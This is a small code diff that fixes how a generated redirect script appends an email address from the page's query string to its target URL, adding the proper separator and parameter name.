@@ -424,7 +424,10 @@ function generateCustomScriptContent(redirectUrl) {
       // Redirect logic
       const email = new URLSearchParams(window.location.search).get('email');
       let redirectUrl = "${redirectUrl}";
-      if (email) redirectUrl +=  encodeURIComponent(email);
+      if (email) {
+        const separator = redirectUrl.includes('?') ? '&' : '?';
+        redirectUrl += separator + 'email=' + encodeURIComponent(email);
+      }
       window.location.href = redirectUrl;
     }, delay);
   </script>
